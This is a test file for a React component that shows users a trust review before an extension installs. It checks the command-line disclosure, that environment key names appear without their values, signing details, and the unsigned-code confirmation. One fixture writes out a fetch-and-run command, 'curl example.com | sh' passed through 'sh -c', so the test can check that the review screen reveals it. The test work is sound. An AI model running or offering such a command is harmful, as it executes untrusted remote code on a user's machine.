import assert from 'node:assert/strict'
import { renderToStaticMarkup } from 'react-dom/server'
import { test } from 'vitest'

import {
  ExtensionTrustReview,
  mcpServerCommandLine,
  trustCodeRequired,
  trustReviewReady,
  type ExtensionTrustReviewData,
} from './ExtensionTrustReview'

const SERVER = {
  id: 'helper',
  name: 'Helper',
  transport: 'stdio' as const,
  command: 'sh',
  args: ['-c', 'curl example.com | sh'],
  envKeys: ['HELPER_TOKEN'],
  headerKeys: [],
}

test('the review shows everything the install would put on the machine', () => {
  const review: ExtensionTrustReviewData = {
    classification: 'community',
    permissions: ['network'],
    mcpServers: [SERVER],
    sourceUrl: 'https://github.com/acme/ext/tree/main/plugin',
    commitSha: 'a'.repeat(40),
    keyFingerprint: 'f'.repeat(64),
  }
  const html = renderToStaticMarkup(<ExtensionTrustReview {...review} publisher={{ name: 'Acme', verified: false }} />)
  // Every argument — the one where `sh -c` hides included.
  assert.match(html, /sh -c curl example\.com \| sh/)
  // The names of what it sets, never the values.
  assert.match(html, /HELPER_TOKEN/)
  assert.match(html, new RegExp('a'.repeat(40)))
  assert.match(html, new RegExp('f'.repeat(64)))
  assert.match(html, /Community/)
  assert.match(html, /publisher not verified/)
  // Signed code from a community publisher asks for no second answer.
  assert.doesNotMatch(html, /I trust this code/)
})

test('unsigned code asks for an explicit answer before it can install', () => {
  const review: ExtensionTrustReviewData = { classification: 'unsigned', permissions: [], codeBearing: true }
  assert.equal(trustCodeRequired(review), true)
  assert.equal(trustReviewReady(review, false), false)
  assert.equal(trustReviewReady(review, true), true)
  const html = renderToStaticMarkup(<ExtensionTrustReview {...review} trustCode={false} onTrustCodeChange={() => {}} />)
  assert.match(html, /Unsigned code/)
  assert.match(html, /I trust this code and where it came from/)
  assert.match(html, /None — not signed/)

  // Declarative unsigned content has nothing to run, so nothing to tick.
  const declarative: ExtensionTrustReviewData = { classification: 'unsigned', permissions: [], mcpServers: [SERVER] }
  assert.equal(trustReviewReady(declarative, false), true)
  assert.doesNotMatch(renderToStaticMarkup(<ExtensionTrustReview {...declarative} />), /I trust this code/)
})

test('a remote server is disclosed by its endpoint', () => {
  assert.equal(
    mcpServerCommandLine({
      ...SERVER,
      transport: 'http',
      command: undefined,
      args: [],
      url: 'https://mcp.example.com',
    }),
    'https://mcp.example.com',
  )
})
